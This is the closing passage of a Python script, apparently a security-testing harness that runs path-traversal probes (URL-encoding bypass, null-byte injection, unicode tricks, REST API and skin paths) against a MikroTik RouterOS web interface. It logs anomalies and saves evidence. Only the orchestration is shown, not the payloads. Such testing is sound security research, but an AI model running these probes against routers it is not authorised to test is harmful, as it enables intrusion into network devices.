    # Pre-flight check
    alive = check_router_alive()
    if not alive.get("alive"):
        log("FATAL: Router at [REDACTED-INTERNAL-IP] is not responding. Aborting.")
        sys.exit(1)
    log(f"Router alive: version={alive.get('version')}, uptime={alive.get('uptime')}")

    try:
        # Establish baselines first
        baseline = establish_baseline()

        # Run all test sections
        test_webfig_traversal()         # ~15 tests
        test_url_encoding_bypass()      # ~12 tests
        test_null_byte_injection()      # ~10 tests
        test_unicode_normalization()    # ~8 tests
        test_backslash_variants()       # ~8 tests
        test_long_path_truncation()     # ~6 tests
        test_rest_api_traversal()       # ~10 tests
        test_skin_theme_traversal()     # ~8 tests
        test_known_routeros_paths()     # ~12 tests
        test_method_traversal()         # ~10 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Final health check
        log("=" * 60)
        log("Final Health Check")
        log("=" * 60)
        final_health = check_router_alive()
        log(f"Router status: {final_health}")

        # Print summary
        log("")
        log("=" * 60)
        log("SUMMARY")
        log("=" * 60)

        total = ec.results["metadata"]["total_tests"]
        anomalies = ec.results["metadata"]["anomalies"]
        findings = len(ec.results["findings"])

        log(f"Total tests:  {total}")
        log(f"Anomalies:    {anomalies}")
        log(f"Findings:     {findings}")

        if findings > 0:
            log("")
            log("Findings detail:")
            for f in ec.results["findings"]:
                log(f"  [{f['severity']}] {f['title']}")

        # Categorize test results
        categories = {}
        for test in ec.results["tests"]:
            cat = test.get("category", "unknown")
            if cat not in categories:
                categories[cat] = {"total": 0, "anomalies": 0}
            categories[cat]["total"] += 1
            if test.get("anomaly"):
                categories[cat]["anomalies"] += 1

        log("")
        log("Tests by category:")
        for cat, counts in sorted(categories.items()):
            log(f"  {cat:25s}: {counts['total']:3d} tests, {counts['anomalies']:3d} anomalies")

        # Save evidence
        ec.save("attack_www_traversal.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
